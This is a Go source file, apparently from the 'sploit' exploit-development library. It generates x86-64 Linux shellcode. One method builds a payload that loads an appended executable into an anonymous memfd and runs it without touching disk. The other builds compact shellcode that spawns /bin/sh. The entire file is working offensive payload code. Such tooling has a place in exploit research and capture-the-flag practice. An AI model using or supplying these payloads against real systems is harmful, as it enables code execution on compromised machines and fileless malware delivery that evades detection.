package shellcode

import (
	"bytes"
	sp "github.com/zznop/sploit"
)

// X8664 is a shellcode interface for 64-bit intel processors
type X8664 struct {
	arch *sp.Processor
}

// NewX8664 returns a pointer to a shellcode X8664 type
func NewX8664() *X8664 {
	arch := &sp.Processor{
		Architecture: sp.ArchX8664,
		Endian:       sp.LittleEndian,
	}

	return &X8664{
		arch: arch,
	}
}

// LinuxMemFdExec constructs a payload to run the supplied executable in an anonymous file descriptor
func (x8664 *X8664) LinuxMemFdExec(payload []byte) ([]byte, error) {
	instrs := `
jmp past

executable_size: .quad 0x4141414141414141   /* fixed up with size of executable */
fd_name: .byte 0                            /* emtpy file descriptor name */
fd_path: .ascii "/proc/self/fd/\0\0\0\0\0"  /* path to file descriptor for exec call */

past:
    mov rax, 319                            /* __NR_memfd_create syscall num */
    lea rdi, [rip+fd_name]                  /* ptr to empty file descriptor name */
    mov rsi, 1                              /* MFD_CLOEXEC (close file descriptor on exec) */
    syscall                                 /* create anonymous fd */
    test rax, rax                           /* good file descriptor? */
    js done                                 /* return if bad file descriptor */
    mov rdi, rax                            /* file descriptor (arg_0) */
    mov rax, 1                              /* __NR_write */
    lea rsi, [rip+executable]               /* pointer to executable base (arg_1) */
    mov rdx, qword [rip+executable_size]    /* load size of executable into rdx (arg_2) */
    syscall                                 /* write the executable to the fd */
    cmp rax, rdx                            /* did everything get written successfully? */
    jnz done                                /* fail out if all bytes were not written */
    call fixup_fd_path                      /* fixup the fd path string by converting the fd to a str */
    mov rax, 59                             /* execve syscall num */
    lea rdi, [rip+fd_path]                  /* filename */
    xor rcx, rcx                            /* zeroize rcx (terminator for argv) */
    push rcx                                /* push 0 to stack */
    push rdi                                /* push address of fd path to the stack */
    mov rsi, rsp                            /* argv (address of fd path, null) */
    xor rdx, rdx                            /* envp = NULL */
    syscall                                 /* call execve (won't return if successful) */
    add rsp, 16                             /* restore the stack */
done:
    ret                                     /* return */

/*
 * fixup the fd path string with the file descrpitor -
 * basically sprintf(foo, "/proc/self/fd/%i", fd)
 */

fixup_fd_path:
    mov rax, rdi                            /* number to be converted */
    mov rcx, 10                             /* divisor */
    xor bx, bx                              /* count digits */
.divide:
    xor rdx, rdx                            /* high part = 0 */
    div rcx                                 /* rcx = rcx:rax/rcx, rdx = remainder */
    push dx                                 /* dx is a digit in range [0..9] */
    inc bx                                  /* count digits */
    test rax, rax                           /* rax is 0? */
    jnz .divide                             /* no, continue */

    /* pop digits from stack in reverse order */
    mov cx, bx                              /* number of digits */
    lea rsi, [rip+fd_path]                  /* rsi points to fd path string buffer */
    add rsi, 14                             /* start of location to write the fd (as a string) */
.next_digit:
    pop ax
    add al, '0'                             /* convert to ASCII */
    mov [rsi], al                           /* write it to the buffer */
    inc si
    loop .next_digit
    ret

/* appended script or ELF executable */
executable:
`
	unconfigured, err := sp.Asm(x8664.arch, instrs)
	if err != nil {
		return nil, err
	}

	size := sp.PackUint64LE(uint64(len(payload)))
	configured := bytes.Replace(unconfigured, []byte{0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41}, size, 1)
	configured = append(configured, payload...)
	return configured, nil
}

// LinuxShell is a method for JIT compiling x86-64 shellcode that executes /bin/sh
func (x8664 *X8664) LinuxShell() ([]byte, error) {
	instrs := `
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
`
	return sp.Asm(x8664.arch, instrs)
}
